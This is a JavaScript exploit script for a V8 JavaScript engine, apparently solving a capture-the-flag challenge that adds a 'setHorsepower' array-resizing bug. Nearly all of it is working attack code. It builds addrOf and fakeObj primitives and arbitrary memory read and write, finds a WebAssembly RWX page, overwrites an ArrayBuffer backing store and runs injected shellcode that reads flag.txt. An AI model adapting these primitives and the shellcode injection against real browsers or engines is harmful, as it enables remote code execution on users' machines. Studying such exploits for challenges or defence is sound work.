/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8) // 8 byte array buffer
var f64_buf = new Float64Array(buf)
var u64_buf = new Uint32Array(buf)

var obj         = { "3vil": "c0de" };
var fltArr      = [ 1.1 ];
var fltMap      = 0x0n;
var fltProps    = 0x0n;
var objArr      = [ obj ];
var tmpArr      = [ 1.1 ];
var fakeObject  = [ 1.1, 1.2 ];

function hex(val){
    return "0x" + val.toString(16)
}

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n) // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn)
    u64_buf[1] = Number(val >> 32n)
    return f64_buf[0]
}

function addrOf(o) {
    objArr[0] = o;
    return ftoi(fltArr[4]) & 0xffffffffn;
}

function fakeObj(addr) {
    fltArr[4] = itof((objMap << 32n) | addr);
    return objArr[0];
}

function readData(addr) {
    fakeObject[1] = itof(
        // fake length
        (0x1n << 33n)
        // fake elements
        | (addr - 0x8n)
    );
    let fakeObjAddr = addrOf(fakeObject);
    let resultObj = fakeObj(fakeObjAddr - 0x10n);
    return ftoi(resultObj[0]);
}

function writeHeap(addr, val) {
    fakeObject[1] = itof(
        // fake length
        (0x1n << 33n)
        // fake elements
        | (addr - 0x8n)
    );
    let fakeObjAddr = addrOf(fakeObject);
    let resultObj = fakeObj(fakeObjAddr - 0x10n);
    resultObj[0] = itof(val);
}

function writeData(addr, val) {
    let bufAddr = addrOf(buf);
    writeHeap(bufAddr + backingStoreOffset, addr);
    dataview.setBigUint64(0, val, true);
}

function leakFltArr() {
    console.log("[*] Leaking float array values");
    fltMap = ftoi(fltArr[14]) & 0xffffffffn;
    fltProps = (ftoi(fltArr[14]) >> 32n) & 0xffffffffn;
    console.log("[+] PACKED_DOUBLE_ELEMENTS map is @", hex(fltMap));
    console.log("[+] float array properties @", hex(fltProps));
    fakeObject[0] = itof((fltProps << 32n) | fltMap);
}

fltArr.setHorsepower(0x30);
objArr.setHorsepower(0x30);

var objMap = (ftoi(fltArr[4]) >> 32n) & 0xffffffffn;
console.log("[+] PACKED_ELEMENTS map is @", hex(objMap));
leakFltArr();

console.log("[*] Attempting to leak uncompressed address");
var buf = new ArrayBuffer(0x100);
var backingStoreOffset = 0x14n;

var bufAddr = addrOf(buf);
console.log("[+] evil buf @", hex(bufAddr));
var backingStore = readData(bufAddr + backingStoreOffset);
console.log("[+] backing store @", hex(backingStore));

var dataview = new DataView(buf);

// create wasm instance and rwx page
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

rwx_page = readData(addrOf(wasm_instance) + 104n);

console.log("[+] rwx @", hex(rwx_page));

// var shellcode = [0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
shellcode = [0xcfe016a, 0x66b84824, 0x2e67616c, 0x50747874, 0x4858026a, 0xf631e789, 0x90050f99, 0x41909090, 0xffffffba, 0xc689487f, 0x6a58286a, 0xf995f01, 0x5]

console.log("[*] overwriting backing store with RWX page address")
writeHeap(addrOf(buf) + backingStoreOffset, rwx_page);
console.log("[*] writing shellcode to execute \"$ cat flag.txt\"")
for (i = 0; i < shellcode.length; ++i) {
    dataview.setBigUint64(i*4, BigInt(shellcode[i]), true);
}

console.log("[*] executing shellcode")
f();
